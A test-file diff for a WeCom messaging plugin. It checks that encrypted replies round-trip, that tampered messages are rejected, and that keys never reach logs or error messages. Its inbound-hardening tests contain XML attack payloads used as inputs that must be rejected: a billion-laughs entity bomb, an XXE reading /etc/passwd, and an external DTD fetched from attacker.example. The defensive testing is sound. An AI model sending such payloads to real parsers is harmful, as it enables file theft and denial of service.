@@ -199,3 +199,260 @@ class TestWecomCallbackBodySizeLimit:
         assert response.status == 413
 
 
+# --------------------------------------------------------------------------- #
+# WAVE-29 §6: WeCom encrypted-reply regression + XML security hardening.
+#
+# The encrypted-reply path (WXBizMsgCrypt.encrypt) shipped broken: it built the
+# outbound envelope with stdlib ElementTree constructors imported from the
+# defusedxml module, which does not re-export them, so encrypt() raised
+# AttributeError before any reply could be sent. These tests pin the fix
+# (outbound construction with the stdlib builder) while proving the inbound
+# untrusted-XML parser stays defused (XXE / entity-expansion fail closed) and
+# that no key/plaintext leaks into errors.
+# --------------------------------------------------------------------------- #
+import base64 as _base64
+import logging
+import os as _os
+
+import pytest as _pytest
+
+from defusedxml.common import DefusedXmlException
+from plugins.platforms.wecom.wecom_crypto import (
+    DecryptError,
+    SignatureError,
+    WeComCryptoError,
+)
+
+
+def _fresh_aes_key() -> str:
+    """A valid 43-char WeCom EncodingAESKey distinct from the fixture key."""
+    return _base64.b64encode(_os.urandom(32)).decode("ascii").rstrip("=")
+
+
+def _crypt(app=None):
+    app = app or _app()
+    return WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])
+
+
+def _envelope_fields(encrypted_xml):
+    root = ET.fromstring(encrypted_xml)
+    return {
+        "Encrypt": root.findtext("Encrypt", default=""),
+        "MsgSignature": root.findtext("MsgSignature", default=""),
+        "TimeStamp": root.findtext("TimeStamp", default=""),
+        "Nonce": root.findtext("Nonce", default=""),
+    }
+
+
+class TestWecomEncryptedReplyRoundtrip:
+    """Outbound construction works; every reply round-trips back to plaintext."""
+
+    def test_encrypt_produces_wellformed_envelope_with_all_fields(self):
+        crypt = _crypt()
+        out = crypt.encrypt("<xml><Content>ok</Content></xml>",
+                            nonce="n1", timestamp="1710000000")
+        fields = _envelope_fields(out)
+        assert fields["Encrypt"]  # non-empty ciphertext
+        assert fields["Nonce"] == "n1"
+        assert fields["TimeStamp"] == "1710000000"
+        # signature is deterministic over token+timestamp+nonce+encrypt
+        assert len(fields["MsgSignature"]) == 40  # sha1 hexdigest
+
+    def test_reply_roundtrips_to_original_plaintext(self):
+        crypt = _crypt()
+        payload = "<xml><Content>hello reply</Content></xml>"
+        out = crypt.encrypt(payload, nonce="nonce9", timestamp="123")
+        f = _envelope_fields(out)
+        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+        assert back.decode("utf-8") == payload
+
+    def test_unicode_content_roundtrips(self):
+        crypt = _crypt()
+        payload = "<xml><Content>你好\U0001f600 café</Content></xml>"
+        f = _envelope_fields(crypt.encrypt(payload, nonce="n", timestamp="1"))
+        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+        assert back.decode("utf-8") == payload
+
+    def test_xml_special_chars_are_escaped_and_survive_roundtrip(self):
+        crypt = _crypt()
+        # Ampersands / angle brackets inside a reply must be escaped by the
+        # builder (never string-concatenated) and decode back byte-identical.
+        payload = "<xml><Content>a &amp; b &lt;tag&gt; \"q\" 'q'</Content></xml>"
+        out = crypt.encrypt(payload, nonce="n", timestamp="1")
+        # The envelope itself must be parseable (proves proper escaping).
+        f = _envelope_fields(out)
+        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+        assert back.decode("utf-8") == payload
+
+    def test_ciphertext_field_is_xml_escaped_when_needed(self):
+        # The Encrypt field is base64 (no metacharacters), but assert the builder
+        # escapes rather than concatenates by feeding an angle bracket through a
+        # field we control and re-parsing the whole envelope without error.
+        crypt = _crypt()
+        out = crypt.encrypt("<xml><Content><![CDATA[x]]></Content></xml>",
+                            nonce="a<b", timestamp="1")
+        # nonce with '<' must come back intact after XML round-trip.
+        assert _envelope_fields(out)["Nonce"] == "a<b"
+
+    def test_empty_content_roundtrips(self):
+        crypt = _crypt()
+        f = _envelope_fields(crypt.encrypt("", nonce="n", timestamp="1"))
+        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+        assert back == b""
+
+    def test_large_payload_roundtrips(self):
+        crypt = _crypt()
+        payload = "<xml><Content>" + ("A" * 200_000) + "</Content></xml>"
+        f = _envelope_fields(crypt.encrypt(payload, nonce="n", timestamp="1"))
+        back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+        assert back.decode("utf-8") == payload
+
+    def test_block_boundary_lengths_roundtrip(self):
+        # PKCS7 block size is 32; exercise lengths around the boundary.
+        crypt = _crypt()
+        for n in (0, 1, 31, 32, 33, 63, 64, 65):
+            payload = "B" * n
+            f = _envelope_fields(crypt.encrypt(payload, nonce="n", timestamp="1"))
+            back = crypt.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+            assert back.decode("utf-8") == payload, f"len={n}"
+
+
+class TestWecomCryptoFailurePaths:
+    """Every tamper / mismatch path fails closed with a typed error."""
+
+    def test_invalid_signature_rejected(self):
+        crypt = _crypt()
+        f = _envelope_fields(crypt.encrypt("<xml/>", nonce="n", timestamp="1"))
+        with _pytest.raises(SignatureError):
+            crypt.decrypt("deadbeef" * 5, f["TimeStamp"], f["Nonce"], f["Encrypt"])
+
+    def test_tampered_ciphertext_rejected_even_with_valid_signature(self):
+        crypt = _crypt()
+        f = _envelope_fields(crypt.encrypt("<xml><Content>x</Content></xml>",
+                                           nonce="n", timestamp="1"))
+        raw = _base64.b64decode(f["Encrypt"])
+        tampered = bytearray(raw)
+        tampered[20] ^= 0x01
+        tampered_b64 = _base64.b64encode(bytes(tampered)).decode("ascii")
+        # Recompute a VALID signature over the tampered ciphertext so the
+        # signature check passes and the crypto/padding layer must catch it.
+        from plugins.platforms.wecom.wecom_crypto import _sha1_signature
+        sig = _sha1_signature(crypt.token, f["TimeStamp"], f["Nonce"], tampered_b64)
+        with _pytest.raises(WeComCryptoError):
+            crypt.decrypt(sig, f["TimeStamp"], f["Nonce"], tampered_b64)
+
+    def test_malformed_base64_ciphertext_rejected(self):
+        crypt = _crypt()
+        from plugins.platforms.wecom.wecom_crypto import _sha1_signature
+        bad = "!!!not-base64!!!"
+        sig = _sha1_signature(crypt.token, "1", "n", bad)
+        with _pytest.raises(DecryptError):
+            crypt.decrypt(sig, "1", "n", bad)
+
+    def test_wrong_receive_id_rejected(self):
+        sender = _crypt(_app(corp_id="corpAAA"))
+        f = _envelope_fields(sender.encrypt("<xml/>", nonce="n", timestamp="1"))
+        # Same token/key so signature + AES succeed, but receive_id differs.
+        app2 = _app(corp_id="corpBBB")
+        receiver = WXBizMsgCrypt(app2["token"], _app()["encoding_aes_key"], "corpBBB")
+        with _pytest.raises(DecryptError):
+            receiver.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+
+    def test_wrong_aes_key_rejected(self):
+        app = _app()
+        sender = WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])
+        f = _envelope_fields(sender.encrypt("<xml><Content>x</Content></xml>",
+                                            nonce="n", timestamp="1"))
+        # Different key, same token -> signature passes, AES/padding must fail.
+        receiver = WXBizMsgCrypt(app["token"], _fresh_aes_key(), app["corp_id"])
+        with _pytest.raises(WeComCryptoError):
+            receiver.decrypt(f["MsgSignature"], f["TimeStamp"], f["Nonce"], f["Encrypt"])
+
+    def test_invalid_encoding_aes_key_length_rejected_at_construction(self):
+        with _pytest.raises(ValueError):
+            WXBizMsgCrypt("tok", "tooshort", "rid")
+
+
+class TestWecomInboundXmlHardening:
+    """Untrusted inbound XML stays defused: XXE / entity expansion fail closed."""
+
+    def test_billion_laughs_rejected(self):
+        adapter = WecomCallbackAdapter(_config())
+        bomb = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE lolz [<!ENTITY lol "lol">'
+            '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">'
+            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]>'
+            "<xml><MsgType>text</MsgType><Content>&lol3;</Content></xml>"
+        )
+        with _pytest.raises(DefusedXmlException):
+            adapter._build_event(_app(), bomb)
+
+    def test_external_entity_xxe_rejected(self):
+        adapter = WecomCallbackAdapter(_config())
+        xxe = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+            "<xml><MsgType>text</MsgType><Content>&xxe;</Content></xml>"
+        )
+        with _pytest.raises(DefusedXmlException):
+            adapter._build_event(_app(), xxe)
+
+    def test_external_parameter_entity_rejected(self):
+        # The classic external-DTD XXE vector: an external *parameter* entity
+        # declared and referenced in the internal subset. defusedxml forbids the
+        # entity declaration outright, so no external fetch can occur.
+        adapter = WecomCallbackAdapter(_config())
+        payload = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo [<!ENTITY % ext SYSTEM '
+            '"http://attacker.example/evil.dtd"> %ext;]>'
+            "<xml><MsgType>text</MsgType><Content>x</Content></xml>"
+        )
+        with _pytest.raises(DefusedXmlException):
+            adapter._build_event(_app(), payload)
+
+    def test_malformed_xml_rejected(self):
+        adapter = WecomCallbackAdapter(_config())
+        with _pytest.raises(Exception) as exc:
+            adapter._build_event(_app(), "<xml><Content>no close")
+        # Not a silent None: a parse error propagates.
+        assert exc.type is not None
+
+    def test_wellformed_inbound_still_parses(self):
+        adapter = WecomCallbackAdapter(_config())
+        ev = adapter._build_event(
+            _app(),
+            "<xml><ToUserName>ww1234567890</ToUserName>"
+            "<FromUserName>bob</FromUserName><MsgType>text</MsgType>"
+            "<Content>hi</Content><MsgId>9</MsgId></xml>",
+        )
+        assert ev is not None and ev.text == "hi"
+
+
+class TestWecomNoSecretLeakage:
+    """Keys and plaintext never reach exception messages or logs."""
+
+    def test_decrypt_error_does_not_leak_key_or_ciphertext(self):
+        app = _app()
+        crypt = WXBizMsgCrypt(app["token"], app["encoding_aes_key"], app["corp_id"])
+        from plugins.platforms.wecom.wecom_crypto import _sha1_signature
+        bad = _base64.b64encode(b"\x00" * 48).decode("ascii")
+        sig = _sha1_signature(crypt.token, "1", "n", bad)
+        with _pytest.raises(WeComCryptoError) as exc:
+            crypt.decrypt(sig, "1", "n", bad)
+        msg = str(exc.value)
+        assert app["encoding_aes_key"] not in msg
+        assert crypt.key.hex() not in msg
+        assert crypt.key not in msg.encode("utf-8", "ignore")
+
+    def test_encrypt_does_not_log_plaintext(self, caplog):
+        crypt = _crypt()
+        secret_marker = "TOP-SECRET-REPLY-BODY-4242"
+        with caplog.at_level(logging.DEBUG):
+            crypt.encrypt(f"<xml><Content>{secret_marker}</Content></xml>",
+                          nonce="n", timestamp="1")
+        for rec in caplog.records:
+            assert secret_marker not in rec.getMessage()
+            assert crypt.key.hex() not in rec.getMessage()
+
